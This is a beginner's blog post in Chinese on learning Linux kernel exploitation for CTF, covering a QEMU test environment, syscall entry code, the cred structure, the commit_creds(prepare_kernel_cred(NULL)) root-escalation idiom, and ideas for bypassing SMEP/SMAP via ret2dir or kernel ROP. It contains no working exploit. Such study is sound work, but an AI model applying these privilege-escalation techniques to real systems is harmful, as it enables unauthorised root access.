            <a href="/2022/02/10/%E5%86%85%E6%A0%B8pwn%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%88%9D%E8%AE%A4%E8%AF%86/" class="post-title-link" itemprop="url">内核pwn的环境搭建和初认识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-10 20:31:19 / 修改时间：20:33:39" itemprop="dateCreated datePublished" datetime="2022-02-10T20:31:19+08:00">2022-02-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内核pwn"><a href="#内核pwn" class="headerlink" title="内核pwn"></a>内核pwn</h1><p>今天就先不刷pwnabe.tw上的题了，开整内核方面的东西。</p>
<h2 id="0x1-环境搭建"><a href="#0x1-环境搭建" class="headerlink" title="0x1 环境搭建"></a>0x1 环境搭建</h2><p>搭建1起来没有lot环境搭建困难，通过搭建环境也了解了很多东西，我第一次知道文件系统居然是独立的，以前以为一直和内核紧密相连，也越来越理解一切皆文件这句话了，不管是设备还是什么，都可以当做文件操作，真的很神奇。</p>
<p>我是借鉴（照抄）这个博客搭建环境的<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/258874%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E7%BB%86%E5%BE%88%E6%A3%92%EF%BC%8C%E4%B8%8D%E4%BB%85%E8%AE%B2%E4%BA%86%E4%B8%80%E4%BA%9B%E5%8E%9F%E7%90%86%EF%BC%8C%E8%BF%98%E5%BE%88%E7%BB%86%E8%87%B4%E7%9A%84%E6%8A%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%AE%B2%E6%98%8E%E7%99%BD%E4%BA%86%EF%BC%8C%E5%9C%A8%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E6%88%91%E4%B8%BB%E8%A6%81%E5%8D%A1%E5%9C%A8%E4%B8%A4%E4%B8%AA%E5%9C%B0%E6%96%B9%E4%BA%86%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AF%E6%88%91%E4%B8%8D%E4%BA%86%E8%A7%A3Makefile,%E6%8A%8AM%E5%B0%8F%E5%86%99%E4%BA%86%EF%BC%8C%E5%AF%BC%E8%87%B4%E7%BC%96%E8%AF%91%E6%A8%A1%E5%9D%97%E7%9A%84%E6%97%B6%E5%80%99%E4%B8%80%E7%9B%B4%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E5%BD%93%E6%97%B6%E9%83%BD%E5%BF%AB%E8%87%AA%E9%97%AD%E4%BA%86%EF%BC%8C%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%98%AF%E6%95%B4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E5%9C%A8etc%E7%9A%84initab%E7%BC%96%E5%86%99%E7%9A%84%E6%97%B6%E5%80%99%E6%9C%89%E6%9D%A1%E6%8C%87%E4%BB%A4%E4%B8%8D%E8%83%BD%E7%85%A7%E6%90%AC%EF%BC%8C%E5%8E%9F%E5%8D%9A%E5%AE%A2%E6%8C%87%E4%BB%A4%E5%A6%82%E4%B8%8B">https://www.anquanke.com/post/id/258874，写的很细很棒，不仅讲了一些原理，还很细致的把环境搭建讲明白了，在搭建过程中，我主要卡在两个地方了，一个是我不了解Makefile,把M小写了，导致编译模块的时候一直不成功，当时都快自闭了，另一个是整文件系统的时候，在etc的initab编写的时候有条指令不能照搬，原博客指令如下</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>正确指令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">ttyS0::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>至于原因，我没看懂😃，剩下的照抄就行了，然后kernel就能通过qemu正确运行了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/pwn$ ./boot.sh</span><br><span class="line">warning: TCG doesn&#x27;t support requested feature: CPUID.01H:EDX.vme [bit 1]</span><br><span class="line">warning: TCG doesn&#x27;t support requested feature: CPUID.01H:EDX.vme [bit 1]</span><br><span class="line">mount: mounting none on /sys failed: No such device</span><br><span class="line"></span><br><span class="line">Please press Enter to activate this console. </span><br><span class="line">/ # ls</span><br><span class="line">bin      etc      init     lib64    proc     sbin     usr</span><br><span class="line">dev      home     lib      linuxrc  root     sys</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x2-内核初理解"><a href="#0x2-内核初理解" class="headerlink" title="0x2 内核初理解"></a>0x2 内核初理解</h2><h4 id="内核是什么东西"><a href="#内核是什么东西" class="headerlink" title="内核是什么东西"></a>内核是什么东西</h4><p>内核并不是什么神奇的东西，他也是一个程序，一切的行为都有对应代码支撑，他的定位就是中间层，对上提供用户态程序的运行和对用户态提供抽象的操作硬件的api,对下直接和硬件相互交互的程序。</p>
<h4 id="内核和用户态的切换"><a href="#内核和用户态的切换" class="headerlink" title="内核和用户态的切换"></a>内核和用户态的切换</h4><p>当发生系统调用，产生异常，外设产生中断等事件的时候，会发生用户态到内核太的切换，一般的函数调用思路就是保存当前栈帧的状态，然后跳到新地址，内核态和用户态的切换也是类似，其中用户态到内核态的切换具体过程如下（照搬的）</p>
<ol>
<li><p>通过 <code>swapgs</code> 切换 GS 段寄存器（代码段寄存器），将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p>
</li>
<li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入<code>RSP/ESP</code>。</p>
</li>
<li><p>通过 push 保存各寄存器值，具体的</p>
<p>代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">/* 保存栈值，并设置内核栈 */</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS                /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS                /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx                      /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax                      /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi                      /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi                      /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx                      /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu               /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS                  /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8                       /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9                       /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10                      /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp                 /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure></li>
</ol>
<p>内核态到用户态的切换也是如此</p>
<h4 id="内核的分级保护域"><a href="#内核的分级保护域" class="headerlink" title="内核的分级保护域"></a>内核的分级保护域</h4><p>简称rings,感觉就是权限的意思，大部分现代操作系统只采用ring0权限和ring3权限，ring0权限就是root,kernel就是ring0，ring3权限较低，一般用户态程序就是ring3,以我目前的粗略理解，kernelpwn就是通过内核模块的漏洞对用户态程序进行提权到root然后getshell。</p>
<h4 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h4><p>kernel调度着所有系统资源，进程也是资源，也归kernel管，管理的策略就是使用结构体 <code>task_struct</code> 记录进程信息，每个<code>task_struct</code>都记录着一个进程的信息，其中又有专门的结构体cred记录程序的权限，每个程序都有一个cred结构，如果能修改对应进程的cred，那也就能修改这个进程的权限了，结构体源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h4 id="进程权限改变"><a href="#进程权限改变" class="headerlink" title="进程权限改变"></a>进程权限改变</h4><p>进程提权主要依靠两个协力完成。</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong>，假如传入的是null，那函数就会返回一个root权限的cred.</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li>
</ul>
<p>通过commit_creds(prepare_kernel_cred(NULL))这套组合拳就能把用户态进程的cred更新为一个root的cred.</p>
<p>（也有可能直接溢出改，我猜的，毕竟还没做过题😃）</p>
<h4 id="内核保护机制"><a href="#内核保护机制" class="headerlink" title="内核保护机制"></a>内核保护机制</h4><p><strong>KASLR</strong>：内核地址随机化，和aslr类似，知道了一个地址再加上一个偏移就能知道基地址了，在没开启KASLR的时候，内核的基地址是0xffffffff81000000</p>
<p><strong>STACK PROTECTOR</strong>：和canary类似，用以检测是否发生了内核堆栈溢出，如果发生内核堆栈溢出则会产生kernel panic.</p>
<p><strong>SMAP/SMEP</strong>:smap的作用时阻止内核空间直接访问用户空间的数据，smep用以阻止内核空间执行用户空间的数据。目的是让内核空间和用户空间完全隔开。</p>
<p>一共有两种绕过（照搬）</p>
<ul>
<li>在设计中，为了使隔离的数据进行交换时具有更高的性能，隐性地址共享始终存在（VDSO &amp; VSYSCALL），<strong>用户态进程与内核共享同一块物理内存</strong>，因此通过隐性内存共享可以完整的绕过软件和硬件的隔离保护，这种攻击方式被称之为<code>ret2dir</code>（return-to-direct-mapped memory ）</li>
<li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行ret2usr</li>
</ul>
<p><strong>KPTI</strong>：KPTI即<code>内核页表隔离</code>（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化（完全没理解）</p>
<h4 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h4><p>可装载内核模块，简称LKMs,顾名思义就是内核中可装载可拆卸的程序，可以提供内核原本不具备的服务又不至于重新更新整个系统的东西，一般的kernelpwn题的漏洞都是出在出题人自己写的lkms上面。</p>
<ul>
<li><code>lsmod</code>：列出现有的LKMs</li>
<li><code>insmod</code>：装载新的LKM（需要root）</li>
<li><code>rmmod</code>：从内核中移除LKM（需要root）</li>
</ul>
<h4 id="内核态函数调用-照搬"><a href="#内核态函数调用-照搬" class="headerlink" title="内核态函数调用(照搬)"></a>内核态函数调用(照搬)</h4><ol>
<li><code>printf()</code>变更为**<code>printk()</code>**，但需要注意的是<code>printk()</code><strong>不一定会把内容显示到终端上，但一定在内核缓冲区里</strong>，可以通过 <code>dmesg</code> 查看效果。</li>
<li><code>memcpy()</code>变更为<code>copy_from_user()/copy_to_user()</code><ul>
<li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li>
<li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
</ul>
</li>
<li><code>malloc()</code>变更为**<code>kmalloc()</code>**，内核态的内存分配函数，和<code>malloc()</code>相似，但使用的是 <code>slab/slub</code> 分配器</li>
<li><code>free()</code>变更为**<code>kfree()</code>**，同 <code>kmalloc()</code></li>
</ol>
<p>对内核的搭建和认识就到这了，下面进入实战阶段</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
